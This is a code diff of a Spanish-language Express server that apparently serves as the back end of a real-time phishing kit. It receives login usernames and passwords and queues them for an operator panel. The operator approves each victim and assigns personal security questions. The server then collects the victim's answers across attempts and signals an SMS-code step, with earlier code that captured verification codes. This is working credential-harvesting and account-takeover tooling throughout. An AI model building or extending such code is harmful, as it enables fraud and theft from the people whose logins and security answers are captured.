@@ -6,36 +6,22 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Datos en memoria
-let preguntas = [
-  { id: 1, texto: "¿Cuál es tu cantante favorito?" },
-  { id: 2, texto: "¿Cuál es el primer nombre de tu primo(a) materno mayor?" }
-];
-let respuestas = [];
-let solicitantes = [];
-let codigosVerificacion = [];
-let nextPreguntaId = 3;
+// Datos en memoria - para simplificar, usa base de datos si puedes
+let solicitantes = []; // Usuarios con estado y sessionId
+let preguntasPorUsuario = []; // Preguntas asignadas a usuarios específicos
+let respuestasPorUsuario = []; // Respuestas e intentos guardados
+
 let nextSolicitanteId = 1;
-let nextCodigoId = 1;
 
-// Servir archivos estáticos y panel.html
-app.use(express.static(path.join(__dirname)));
-
-// RUTA PRINCIPAL para recibir login desde la web pública
+// Ruta para recibir login y crear solicitud pendiente
 app.post('/', (req, res) => {
   const { usr, clv, device, id, website } = req.body;
 
-  // Honeypot (campo trampa) para evitar bots
-  if (website) {
-    return res.status(400).json({ success: false, error: 'Actividad sospechosa detectada.' });
-  }
+  if (website) return res.status(400).json({ success: false, error: 'Actividad sospechosa detectada.' });
+  if (!usr || !clv) return res.status(400).json({ success: false, error: 'Faltan datos de usuario o clave.' });
 
-  // Validación mínima
-  if (!usr || !clv) {
-    return res.status(400).json({ success: false, error: 'Faltan datos de usuario o clave.' });
-  }
+  const sessionId = id || Date.now().toString();
 
-  // Guardar la solicitud
   solicitantes.push({
     id: nextSolicitanteId++,
     usuario: usr,
@@ -43,128 +29,107 @@ app.post('/', (req, res) => {
     estado: 'pendiente',
     fecha: new Date(),
     device,
-    sessionId: id
+    sessionId
   });
 
   console.log("Solicitud login recibida:", usr);
 
-  res.json({ success: true, sessionId: id });
+  res.json({ success: true, sessionId });
 });
 
-// NUEVA RUTA /api/verificar para controlar el flujo de pasos
-app.get('/api/verificar', (req, res) => {
-  const sessionId = req.query.id;
-
-  if (!sessionId) {
-    return res.status(400).json({ error: 'Falta id de sesión' });
-  }
-
-  const solicitud = solicitantes.find(s => s.sessionId === sessionId);
-
-  if (!solicitud) {
-    return res.json({ estado: 'falso' });
-  }
-
-  const hayPreguntas = preguntas.length > 0;
-
-  let estadoFrontend;
-
-  switch (solicitud.estado) {
-    case 'pendiente':
-      estadoFrontend = 'mostrar_sms';  // Paso inicial - usuario espera
-      break;
-
-    case 'aprobado':
-      // Si hay preguntas, pasamos a mostrar preguntas
-      if (hayPreguntas) {
-        estadoFrontend = 'mostrar_preguntas_usuario';
-      } else {
-        // Si no hay preguntas, puede mantenerse pendiente o definir otro flujo
-        estadoFrontend = 'pendiente';
-      }
-      break;
-
-    case 'rechazado':
-      estadoFrontend = 'rechazado';  // Vuelve al primer paso o error
-      break;
-
-    default:
-      estadoFrontend = 'falso';
-  }
-
-  return res.json({ estado: estadoFrontend });
-});
-
-// Preguntas
-app.get('/preguntas', (req, res) => res.json(preguntas));
-app.post('/preguntas', (req, res) => {
-  const { texto } = req.body;
-  if (!texto) return res.status(400).json({ error: 'Falta texto' });
-  const p = { id: nextPreguntaId++, texto };
-  preguntas.push(p);
-  res.status(201).json(p);
-});
-app.delete('/preguntas/:id', (req, res) => {
-  const id = +req.params.id;
-  preguntas = preguntas.filter(p => p.id !== id);
-  res.json({ message: 'Pregunta eliminada' });
-});
-
-// Respuestas
-app.post('/respuestas', (req, res) => {
-  const { usuario, respuestasUsuario } = req.body;
-  if (!usuario || !respuestasUsuario) return res.status(400).json({ error: 'Datos incompletos' });
-  respuestas.push({ id: respuestas.length + 1, usuario, respuestasUsuario, fecha: new Date() });
-  res.status(201).json({ message: 'Respuestas recibidas' });
-});
-app.get('/respuestas', (req, res) => res.json(respuestas));
-
-// Solicitudes login (desde panel)
+// Panel lee todas las solicitudes
 app.get('/solicitantes', (req, res) => res.json(solicitantes));
+
+// Actualizar estado y asignar preguntas al aprobar
 app.put('/solicitantes/:id', (req, res) => {
   const id = +req.params.id;
-  const { estado } = req.body;
+  const { estado, preguntas } = req.body;
   const s = solicitantes.find(sol => sol.id === id);
   if (!s) return res.status(404).json({ error: 'No encontrado' });
+
   s.estado = estado || s.estado;
+
+  if (estado === 'aprobado' && preguntas && preguntas.length === 2) {
+    // Asigna preguntas solo cuando apruebas y envías las 2 preguntas específicas
+    const existente = preguntasPorUsuario.find(pu => pu.sessionId === s.sessionId);
+    if (existente) {
+      existente.preguntas = preguntas;
+    } else {
+      preguntasPorUsuario.push({ sessionId: s.sessionId, preguntas });
+    }
+  }
+
   res.json(s);
 });
 
-// Códigos de verificación
-app.post('/codigo', (req, res) => {
-  const { usuario, codigo } = req.body;
-  if (!usuario || !codigo) return res.status(400).json({ error: 'Datos incompletos' });
+// Ruta para que frontend compruebe estado y controle pasos
+app.get('/api/verificar', (req, res) => {
+  const sessionId = req.query.id;
+  if (!sessionId) return res.status(400).json({ error: 'Falta id de sesión' });
 
-  const index = codigosVerificacion.findIndex(c => c.usuario === usuario);
-  if (index !== -1) {
-    codigosVerificacion[index].codigo = codigo;
-    codigosVerificacion[index].estado = 'pendiente';
-  } else {
-    codigosVerificacion.push({
-      id: nextCodigoId++,
-      usuario,
-      codigo,
-      estado: 'pendiente',
-      fecha: new Date()
-    });
+  const solicitud = solicitantes.find(s => s.sessionId === sessionId);
+  if (!solicitud) return res.json({ estado: 'falso' });
+
+  if (solicitud.estado === 'pendiente') return res.json({ estado: 'mostrar_sms' });
+  if (solicitud.estado === 'rechazado') return res.json({ estado: 'rechazado' });
+
+  if (solicitud.estado === 'aprobado') {
+    const asignacion = preguntasPorUsuario.find(pu => pu.sessionId === sessionId);
+    if (asignacion && asignacion.preguntas.length === 2) {
+      return res.json({ estado: 'mostrar_preguntas_usuario' });
+    } else {
+      // Sin preguntas asignadas aún, espera
+      return res.json({ estado: 'pendiente' });
+    }
   }
-  res.json({ message: 'Código recibido, pendiente validación' });
+
+  return res.json({ estado: 'falso' });
 });
-app.get('/codigos', (req, res) => res.json(codigosVerificacion));
-app.put('/codigos/:id', (req, res) => {
-  const id = +req.params.id;
-  const { estado } = req.body;
-  const c = codigosVerificacion.find(c => c.id === id);
-  if (!c) return res.status(404).json({ error: 'No encontrado' });
-  c.estado = estado || c.estado;
-  res.json(c);
+
+// Ruta para que frontend pida las preguntas que debe responder el usuario
+app.get('/api/preguntas-usuario', (req, res) => {
+  const sessionId = req.query.id;
+  if (!sessionId) return res.status(400).json({ error: 'Falta id de sesión' });
+  const asignacion = preguntasPorUsuario.find(pu => pu.sessionId === sessionId);
+  if (!asignacion) return res.json({ preguntas: [] });
+  res.json({ preguntas: asignacion.preguntas });
 });
+
+// Ruta para guardar respuestas del usuario (puede ser varios intentos)
+app.post('/api/respuestas-usuario', (req, res) => {
+  const { sessionId, respuestas } = req.body;
+
+  if (!sessionId || !respuestas || !Array.isArray(respuestas) || respuestas.length !== 2) {
+    return res.status(400).json({ error: 'Datos incompletos o incorrectos' });
+  }
+
+  let registro = respuestasPorUsuario.find(r => r.sessionId === sessionId);
+  if (!registro) {
+    registro = { sessionId, intentos: [] };
+    respuestasPorUsuario.push(registro);
+  }
+
+  registro.intentos.push({ respuestas, fecha: new Date() });
+
+  res.json({ message: 'Respuestas guardadas' });
+});
+
+// Ver respuestas ingresadas por usuario (para que tú las revises)
+app.get('/api/respuestas-usuario', (req, res) => {
+  const sessionId = req.query.id;
+  if (!sessionId) return res.status(400).json({ error: 'Falta id de sesión' });
+  const registro = respuestasPorUsuario.find(r => r.sessionId === sessionId);
+  res.json(registro || { intentos: [] });
+});
+
+// Servir archivos estáticos (HTML, CSS, JS)
+app.use(express.static(path.join(__dirname)));
 
 // Servir panel principal
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
-
+// Puerto y servidor
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor escuchando en puerto ${PORT}`));
